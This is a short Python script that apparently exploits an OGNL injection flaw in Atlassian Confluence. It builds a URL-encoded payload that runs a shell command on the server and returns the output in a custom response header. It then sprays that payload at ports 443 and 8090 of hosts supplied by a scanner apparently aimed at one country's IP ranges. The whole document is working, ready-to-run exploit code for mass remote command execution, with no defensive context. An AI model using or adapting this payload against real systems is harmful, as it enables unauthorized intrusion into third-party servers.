from spike import ScanIP
import requests
from urllib.parse import quote

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def gen_payload(cmd: str):
    """Generate Payload for RCE"""

    payload = '${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("' + cmd + '").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}'
    payload = quote(payload)
    return payload

def exploit(ip)->None:
    for port in [443, 8090]:
        try:
            response = requests.get(f'https://{ip}:{port}/{gen_payload("id")}/',verify=False, headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"}, allow_redirects=False)
            if 'X-Cmd-Response' in response.headers:
                print(f"[+] {ip} ->> {response.headers['X-Cmd-Response']}")
        except Exception as e:
            continue

if __name__ == "__main__":
    s = ScanIP("ir")
    s.scan(exploit)
